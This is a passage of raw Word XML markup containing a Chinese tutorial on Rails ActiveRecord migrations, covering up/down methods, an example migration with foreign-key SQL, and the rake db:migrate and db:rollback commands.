        <w:t>方法而需要同时写</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285582EF"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3.6 使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738CDAB2"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Migration里面的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法能复原</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法所造成的变更。也就是说如果执行了</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>然后 再执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，那么数据库的schema应该会没有改变。所以说，如果用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>建立一个数据表， 就应该在</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法中删除它。明智的做法会使用跟</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>完全相反的顺便来做这些事情。 例如，</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="1F68465A" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7DAED0A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ExampleMigration &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="368694F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up</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="640DB7E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create_table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7D54C92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t.references :category</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38B675E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4AD6CFF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#add a foreign key</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DF488B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execute &lt;&lt;-SQL</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="192E0D2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ALTER</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>TABLE</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>products</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16BC6DB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ADD</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>CONSTRAINT</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>fk_products_categories</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55CA9ED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FOREIGN</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>KEY</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>(category_id)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="593C53E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REFERENCES</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>categories(id)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A6BAEC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SQL</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="101D6E7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add_column :users, :home_page_url, :string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5423F1C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rename_column :users, :email, :email_address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01FFF0C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52C5020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6AEC549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down</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0775E14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rename_column :users, :email_address, :email</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="504F174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remove_column :users, :home_page_url</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="053E215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execute &lt;&lt;-SQL</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B91F92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ALTER</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>TABLE</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>products</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A10DC6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DROP</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>FOREIGN</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>KEY</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>fk_products_categories</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23E4704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SQL</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DB510B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drop_table :products</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7650098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778AB5A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E5FAD7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有时候，你的migrations会做出一些无法复原的事，例如删掉某些资料之类的。在这种情况 下，你可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法中抛出(raise)</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::IrreversibleMigration</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这样一 来如果有人想恢复你的migration时就会出现错误信息，显示它无法执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378E3546"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4 执行Migrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659E9B4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Rails提供一系列rake任务来执行migrations。第一个跟migration相关的rake任务是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。它最基本有用法就是单纯地执行所有还没执行migrations的up或者 change方法。若所有migrations都执行过了，它就会直接结束。执行的顺序是按照migration 的日期。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B75B92"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值得注意的是执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>也会一起执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db:schema:dump</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，去更新db/schema.rb文件， 以便跟数据库的结构同步。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654097A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如果你要migrate到某个特定版本，Active Record会执行所需的migrations(up,down,change) 直到到达指定的版本为上。所谓版本就是migration文件名前面的那串数字。例如要迁移到 版本20080906120000，只需执行:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="125408CB" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A07A50E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="309946949"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake db:migrate VERSION=20080906120000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3CE20D3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如果指定的版本大于当前的版本（往上迁移），那么就会执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法到包含指定版本在内的 所有版本。如果是往下迁移的话则会执行所有</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法，但不包括指定版本本身。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4721DD08"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4.1 回滚（Rolling Back）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792964E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另一个常见的任务是回滚最后一个版本。比如你不小心打错了要修正。输入回滚命令时可以 不用输入先前版本的版本号，直接这样就行了：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2160"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="33A770C1" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="440FF7EF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1311713532"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake db:rollback</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="399D694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这样会执行最后一个migration的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法。如果要恢复多个migrations的话，可以多给 一个STEP参数：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4B1B65EE" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66DD192B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="490752737"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
